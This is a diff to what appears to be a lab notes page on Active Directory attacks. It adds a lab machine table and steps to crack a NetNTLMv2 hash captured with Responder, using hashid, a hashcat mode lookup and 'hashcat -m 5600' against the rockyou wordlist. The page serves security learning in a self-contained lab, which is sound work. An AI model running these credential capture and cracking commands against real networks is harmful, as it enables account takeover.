@@ -12,7 +12,23 @@ This page provides a quick overview of some of the techniques currently tested w
 
 ---
 
+# Lab Environment
+
+| Machine | Role | Operating System |
+|---|---|---|
+| WINDOWS-DC | Domain Controller | Windows Server 2019 |
+| CLIENT1 | Domain Workstation | Windows 11 |
+| KALI | Attacker Machine | Kali Linux |
+
+Domain: DOMAIN.local
+
+---
+
 # Lab Scenarios
+
+## Host Discovery & Enumeration
+
+
 
 ## NTLM Credential Capture & Cracking
 
@@ -27,3 +43,24 @@ sudo responder -I eth0 -dwv
 ![responder](Images/responder.png)
 
 ### Identify Hash Type
+```
+hashid admin.hash
+```
+
+![hashid](Images/hashid.png)
+
+Finding hashcat mode:
+```
+hashcat -h | grep NTLM
+```
+
+![mode](Images/mode.png)
+
+### Crack NeNTLMv2 Hash
+
+NetNTLMv2 hashes can be cracked using Hashcat:
+```
+hashcat -m 5600 admin.hash /usr/share/wordlists/rockyou.txt
+```
+
+![administrator](Images/administrator.png)
